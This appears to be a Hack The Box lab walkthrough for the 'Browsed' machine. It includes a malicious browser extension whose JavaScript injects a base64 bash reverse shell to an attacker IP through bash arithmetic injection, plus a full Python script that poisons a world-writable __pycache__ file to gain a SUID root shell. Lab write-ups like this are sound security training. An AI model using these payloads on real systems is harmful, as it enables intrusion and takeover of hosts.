# **Browsed - Hack The Box**

*Target Ip. Address : 10.129.16.217*

So, as usual let's start by our nmap scan.

```bash
kali@kali: nmap -sV -sC 10.129.16.217
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-03 18:14 +0545
Nmap scan report for browsed.htb (10.129.16.217)
Host is up (0.76s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
| _  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| _http-title: Browsed
| _http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux _kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.30 seconds
```

So, It says port 22 and 80 are open. Let's add browsed.htb in our /etc/hosts and see what is in the website.


```bash
kali@kali:cat /etc/hosts
10.129.16.217  browsed.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

 # The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

In the website, there is basically place to download extension samples and upload our own extension as well. A developer will use it and reach back with some feedback.

So, let's download one of their samples, and upload the same sample.

In one of the outputs, we see that there is another website too

```output
cup2key=8:LZj _rvCJU5x4gA5oUl8uSk7cuDKjBMzd6Ks _ _nDm08M &cup2hreq=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
[3086:3114:0203/123518.009774:VERBOSE1:network _delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/
[3086:3114:0203/123518.010108:VERBOSE1:network _delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://localhost/
[3057:3057:0203/123518.017436:VERBOSE1:component _installer.cc(560)] FinishRegistration for Masked Domain List 
```

Let's add browsedinternals.htb to our hosts and look what it has for us.


```bash
kali@kali:cat /etc/hosts
10.129.16.217  browsed.htb browsedinternals.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

 # The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

So, it is hosting a Gitea, we can register and see that there is only one repository from user larry called "MarkdownPreview"

In there are two interesting files, app.py (a flask server) and routines.sh

```app.py
from flask import Flask, request, send _from _directory, redirect
from werkzeug.utils import secure _filename

import markdown
import os, subprocess
import uuid

app = Flask( _ _name _ _)
FILES _DIR = "files"

 # Ensure the files/ directory exists
os.makedirs(FILES _DIR, exist _ok=True)

@app.route('/')
def index():
    return '''
    <h1>Markdown Previewer</h1>
    <form action="/submit" method="POST">
        <textarea name="content" rows="10" cols="80"></textarea><br>
        <input type="submit" value="Render  & Save">
    </form>
    <p><a href="/files">View saved HTML files</a></p>
    '''

@app.route('/submit', methods= ['POST'])
def submit():
    content = request.form.get('content', '')
    if not content.strip():
        return 'Empty content. <a href="/">Go back</a>'

    # Convert markdown to HTML
    html = markdown.markdown(content)

    # Save HTML to unique file
    filename = f"{uuid.uuid4().hex}.html"
    filepath = os.path.join(FILES _DIR, filename)
    with open(filepath, 'w') as f:
        f.write(html)

    return f'''
    <p>File saved as <code>{filename}</code>.</p>
    <p><a href="/view/{filename}">View Rendered HTML</a></p>
    <p><a href="/">Go back</a></p>
    '''

@app.route('/files')
def list _files():
    files =  [f for f in os.listdir(FILES _DIR) if f.endswith('.html')]
    links = '  n'.join( [f'<li><a href="/view/{f}">{f}</a></li>' for f in files])
    return f'''
    <h1>Saved HTML Files</h1>
    <ul>{links}</ul>
    <p><a href="/">Back to editor</a></p>
    '''

@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run( ["./routines.sh", rid])
    return "Routine executed !"

@app.route('/view/<filename>')
def view _file(filename):
    filename = secure _filename(filename)
    if not filename.endswith('.html'):
        return "Invalid filename", 400
    return send _from _directory(FILES _DIR, filename)

 # The webapp should only be accessible through localhost
if  _ _name _ _ == ' _ _main _ _':
    app.run(host='127.0.0.1', port=5000)
```

```routines.sh
 #!/bin/bash

ROUTINE _LOG="/home/larry/markdownPreview/log/routine.log"
BACKUP _DIR="/home/larry/markdownPreview/backups"
DATA _DIR="/home/larry/markdownPreview/data"
TMP _DIR="/home/larry/markdownPreview/tmp"

log _action() {
  echo " [$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$ROUTINE _LOG"
}

if  [ [ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  find "$TMP _DIR" -type f -name " *.tmp" -delete
  log _action "Routine 0: Temporary files cleaned."
  echo "Temporary files cleaned."

elif  [ [ "$1" -eq 1 ]]; then
  # Routine 1: Backup data
  tar -czf "$BACKUP _DIR/data _backup _$(date '+%Y%m%d _%H%M%S').tar.gz" "$DATA _DIR"
  log _action "Routine 1: Data backed up to $BACKUP _DIR."
  echo "Backup completed."

elif  [ [ "$1" -eq 2 ]]; then
  # Routine 2: Rotate logs
  find "$ROUTINE _LOG" -type f -name " *.log" -exec gzip {}   ;
  log _action "Routine 2: Log files compressed."
  echo "Logs rotated."

elif  [ [ "$1" -eq 3 ]]; then
  # Routine 3: System info dump
  uname -a > "$BACKUP _DIR/sysinfo _$(date '+%Y%m%d').txt"
  df -h >> "$BACKUP _DIR/sysinfo _$(date '+%Y%m%d').txt"
  log _action "Routine 3: System info dumped."
  echo "System info saved."

else
  log _action "Unknown routine ID: $1"
  echo "Routine ID not implemented."
fi
```

The source code from app.py reveals a Flask-based Markdown Preview application running on localhost port 5000. It exposes an endpoint /routines/ which accepts a routine ID.

The routines is vulnerable to bash arithmetic injection. So, basically we can get a reverse shell witha malicious extension.

Let's create a malicious extension.

```manifest.json
{
  "manifest_version": 3,
  "name": "exploit",
  "version": "0.1",
  "description": "exploit",
  "background": {
    "service_worker": "exploit.js"
  },
  "host_permissions": [
    "http://127.0.0.1/*",
    "http://localhost/*"
  ]
}
```

```exploit.js
(function() {
    const TARGET_BASE = "http://127.0.0.1:5000/routines/";
    const ATTACKER_IP = "10.10.14.33"; 
    const ATTACKER_PORT = "9001";
    const revShellCommand = `bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1'`;
    const b64Payload = btoa(revShellCommand);
    const space = " ";
    const injection = `a[$(echo${space}${b64Payload}|base64${space}-d|bash)]`;
    const finalURL = TARGET_BASE + encodeURIComponent(injection);

    // Optional: Let you know the script started on your port 80 (python -m http.server 80)
    fetch(`http://${ATTACKER_IP}/ALIVE`).catch(() => {});

    // Trigger the Exploit
    fetch(finalURL, { 
        mode: "no-cors",
        cache: "no-cache"
    }).then(() => {
        console.log("Payload sent to internal target.");
    }).catch((err) => {
        console.error("Fetch failed:", err);
    });
})();
```

Zip the files, it is recommended to use Junk Paths Zip command, so that the information remains on root of the Zip file we upload.

```
zip -j exploit.zip manifest.json exploit.js
```

Optional: Start a python server on port 80, just to make sure our script has started.

```bash
kali@kali:python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

And start a listener on the 9001 port.

```bash
kali@kali:penelope -p 9001
 [+] Listening for reverse shells on 0.0.0.0:9001 →  127.0.0.1 • 192.168.11.65 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Now, upload the exploit.zip, and wait until the developer runs it.

We get hit on our python server telling, the script has started to run.

```bash
kali@kali:python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.16.217 - -  [03/Feb/2026 18:45:30] code 404, message File not found
10.129.16.217 - -  [03/Feb/2026 18:45:30] "GET /ALIVE HTTP/1.1" 404 -
```

And, Boom!!!
We get a reverse shell too as a user larry.

```bash
penelope -p 9001
 [+] Listening for reverse shells on 0.0.0.0:9001 →  127.0.0.1 • 192.168.11.65 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from browsed~10.129.16.217-Linux-x86 _64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /home/larry/markdownPreview/.env/bin/python3! 💪 [+] Interacting with session  [1], Shell Type: PTY, Menu key: F12 
 [+] Logging to /home/kali/.penelope/sessions/browsed~10.129.16.217-Linux-x86 _64/2026 _02 _03-18 _48 _06-666.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
larry@browsed:~/markdownPreview$ 
```

We find our first flag in our home directory.

```bash
larry@browsed:~$ cat user.txt
38.....c1
```

There are pair of ssh-keys in the home directory, if you want to ssh with a proper tty, but in my case Penelope has provided me with a proper tty.

```bash
larry@browsed:~/.ssh$ ls
authorized_keys  id_ed25519  id_ed25519.pub
```

Checking sudo privileges, we can run /opt/extensiontool/extension_tool.py as root.

```bash
karry@browsed:~/sudo -l
Matching Defaults entries for larry on browsed:
    env _reset, mail _badpass, secure _path=/usr/local/sbin  :/usr/local/bin  :/usr/sbin  :/usr/bin  :/sbin  :/bin  :/snap/bin, use _pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

Let's see and what we have in there.

```bash
larry@browsed:/opt/extensiontool$ ls -la
total 24
drwxr-xr-x 4 root root 4096 Feb  3 13:08 .
drwxr-xr-x 4 root root 4096 Aug 17 12:55 ..
drwxrwxr-x 5 root root 4096 Mar 23  2025 extensions
-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py
-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py
drwxrwxrwx 2 root root 4096 Feb  3 12:20 __pycache__
```

There are bunch of python scripts, but look at  _ _pycache _ _, it is world-writable. So, cache poisoning is what we will do.

In a /tmp directory, create a python script which will read the original stats, create malicious source, sync, then compile and inject. It will create a temporary rootbash file with SUID enabled.

```exploit.py
import os
import os
import py_compile
import shutil

# --- Configuration ---
ORIGINAL_SOURCE = "/opt/extensiontool/extension_utils.py"
TARGET_CACHE = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"
TEMP_SOURCE = "/tmp/extension_utils.py"
TEMP_PYC = "/tmp/extension_utils.pyc"

def poison_cache():
    try:
        # 1. Get original stats (Size and Mtime)
        print(f"[*] Getting stats from {ORIGINAL_SOURCE}...")
        st = os.stat(ORIGINAL_SOURCE)
        orig_size = st.st_size
        orig_mtime = st.st_mtime
        print(f"    - Original Size: {orig_size} bytes")
        print(f"    - Original Mtime: {orig_mtime}")

        # 2. Define the malicious payload
        payload_code = (
            "import os\n"
            "os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')\n\n"
            "def validate_manifest(path):\n"
            "    return True\n\n"
            "def clean_temp_files():\n"
            "    return True\n"
        )

        # 3. Pad to exact original size
        current_len = len(payload_code)
        if current_len > orig_size:
            print("[-] Error: Your payload is too large for the original file size.")
            return

        padding_needed = orig_size - current_len - 1
        final_source = payload_code + "\n" + ("#" * padding_needed)

        with open(TEMP_SOURCE, "w") as f:
            f.write(final_source)

        # 4. Sync the source timestamp
        os.utime(TEMP_SOURCE, (orig_mtime, orig_mtime))
        print("[+] Malicious source created and timestamp synced.")

        # 5. Compile into Bytecode
        py_compile.compile(TEMP_SOURCE, cfile=TEMP_PYC)
        print(f"[+] Malicious bytecode compiled to {TEMP_PYC}")

        # 6. Inject the poisoned file
        shutil.copyfile(TEMP_PYC, TARGET_CACHE)
        print(f"[+] Poisoned .pyc successfully injected into {TARGET_CACHE}")

    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    poison_cache()
```

Run the exploit.

```bash
larry@browsed:/tmp$ python3 exploit.py
[*] Getting stats from /opt/extensiontool/extension_utils.py...
    - Original Size: 1245 bytes
    - Original Mtime: 1742727379.0
[+] Malicious source created and timestamp synced.
[+] Malicious bytecode compiled to /tmp/extension_utils.pyc
[+] Poisoned .pyc successfully injected into /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
```

Now, run the sudo command.

```bash
larry@browsed:/tmp$ sudo /opt/extensiontool/extension_tool.py --ext Fontify
[-] Skipping version bumping
[-] Skipping packaging
```

Now, check in /tmp, we will have a rootbash as a SUID.

```bash
larry@browsed:/tmp$ ls -la
total 1520
drwxrwxrwt 23 root     root        4096 Feb  3 12:18 .
drwxr-xr-x 23 root     root        4096 Jan  6 10:28 ..
drwxr-xr-x  3 www-data www-data    4096 Feb  3 10:35 extension _6981cf7f0dd1f7.65834723
drwxr-xr-x  3 www-data www-data    4096 Feb  3 10:36 extension _6981cf91c8d318.70511716
-rw-rw-r--  1 larry    larry       1245 Mar 23  2025 extension _utils.py
-rw-rw-r--  1 larry    larry        475 Feb  3 12:18 extension _utils.pyc
drwxrwxrwt  2 root     root        4096 Feb  3 
.
.
.
drwxrwxr-x  2 larry    larry       4096 Feb  3 12:07  _ _pycache _ _
-rwsr-sr-x  1 root     root     1446024 Feb  3 12:18 rootbash
.
.
.
```

Now, use that SUID to become root.

```bash
larry@browsed:/tmp$ ./rootbash -p
rootbash-5.2# id
uid=1000(larry) gid=1000(larry) euid=0(root) egid=0(root) groups=0(root),1000(larry)
```

Finally, read the root.txt from the root directory and finish this challenge.

```bash
rootbash-5.2# cat root.txt
10.....23
```
